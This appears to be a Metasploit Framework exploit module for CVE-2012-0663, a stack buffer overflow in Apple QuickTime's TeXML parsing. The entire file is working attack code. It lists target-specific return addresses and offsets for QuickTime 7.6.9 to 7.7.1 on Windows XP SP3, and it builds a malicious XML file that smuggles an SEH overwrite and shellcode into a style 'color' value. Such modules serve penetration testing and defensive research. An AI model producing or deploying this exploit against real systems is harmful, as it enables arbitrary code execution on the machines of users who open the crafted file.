# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::FILEFORMAT
    include Msf::Exploit::Remote::Seh
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Apple QuickTime TeXML Stack Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a vulnerability found in Apple QuickTime. When handling
                a TeXML file, it is possible to trigger a stack-based buffer overflow, and then
                gain arbitrary code execution under the context of the user.  The flaw is
                generally known as a bug while processing the &#039;transform&#039; attribute, however,
                that attack vector seems to only cause a TerminateProcess call due to a corrupt
                stack cookie, and more data will only trigger a warning about the malformed XML
                file.  This module exploits the &#039;color&#039; value instead, which accomplishes the same
                thing.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;Alexander Gavrun&#039;,  # Vulnerability Discovery
                    &#039;sinn3r&#039;,            # Metasploit Module
                    &#039;juan vazquez&#039;       # Metasploit Module
                ],
            &#039;References&#039;     =>
                [
                    [ &#039;OSVDB&#039;, &#039;81934&#039; ],
                    [ &#039;CVE&#039;, &#039;2012-0663&#039; ],
                    [ &#039;BID&#039;, &#039;53571&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.zerodayinitiative.com/advisories/ZDI-12-095/&#039; ],
                    [ &#039;URL&#039;, &#039;http://support.apple.com/kb/HT1222&#039; ]
                ],
            &#039;Payload&#039;        =>
                {
                    &#039;DisableNops&#039; => true,
                    &#039;BadChars&#039;    => "\x00\x23\x25\x3c\x3e\x7d"
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;QuickTime 7.7.1 on Windows XP SP3&#039;,
                        {
                            &#039;Ret&#039; => 0x66f1bdf8, # POP ESI/POP EDI/RET from QuickTime.qts (7.71.80.42)
                            &#039;Offset&#039; => 643,
                            &#039;Max&#039; => 13508
                        }
                    ],
                    [ &#039;QuickTime 7.7.0 on Windows XP SP3&#039;,
                        {
                            &#039;Ret&#039; => 0x66F1BD66, # PPR from QuickTime.qts (7.70.80.34)
                            &#039;Offset&#039; => 643,
                            &#039;Max&#039; => 13508
                        }
                    ],
                    [ &#039;QuickTime 7.6.9 on Windows XP SP3&#039;,
                        {
                            &#039;Ret&#039; => 0x66801042, # PPR from QuickTime.qts (7.69.80.9)
                            &#039;Offset&#039; => 643,
                            &#039;Max&#039; => 13508
                        }
                    ],
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => &#039;May 15 2012&#039;))
 
        register_options(
            [
                OptString.new(&#039;FILENAME&#039;, [ true, &#039;The file name.&#039;,  &#039;msf.xml&#039;]),
            ], self.class)
    end
 
    def exploit
        my_payload = rand_text(target[&#039;Offset&#039;])
        my_payload << generate_seh_record(target.ret)
        my_payload << payload.encoded
        my_payload << rand_text(target[&#039;Max&#039;] - my_payload.length)
 
        texml = <<-eos
        <?xml version="1.0"?>
        <?quicktime type="application/x-quicktime-texml"?>
 
        <text3GTrack trackWidth="176.0" trackHeight="60.0" layer="1"
            language="eng" timeScale="600"
            transform="matrix(1.0, 0.0, 0.0, 0.0, 1.0, 0.0, 1, 0, 1.0)">
            <sample duration="2400" keyframe="true">
 
                <description format="tx3g" displayFlags="ScrollIn"
                    horizontalJustification="Left"
                    verticalJustification="Top"
                    backgroundColor="0%, 0%, 0%, 100%">
 
                    <defaultTextBox x="0" y="0" width="176"  height="60"/>
                    <fontTable>
                        <font id="1" name="Times"/>
                    </fontTable>
 
                    <sharedStyles>
                    <style id="1">
                        {font-table: 1} {font-size:  10}
                        {font-style:normal}
                        {font-weight: normal}
                        {color: #{my_payload}%, 100%, 100%, 100%}
                    </style>
                    </sharedStyles>
                </description>
 
                <sampleData scrollDelay="200"
                    highlightColor="25%, 45%, 65%, 100%"
                    targetEncoding="utf8">
 
                    <textBox x="10" y="10" width="156"  height="40"/>
                        <text styleID="1">What you need... Metasploit!</text>
                        <highlight startMarker="1" endMarker="2"/>
                        <blink startMarker="3" endMarker="4"/>
                </sampleData>
            </sample>
        </text3GTrack>
        eos
 
        texml = texml.gsub(/^\t\t/,&#039;&#039;)
 
        print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039;.")
        file_create(texml)
    end
 
end



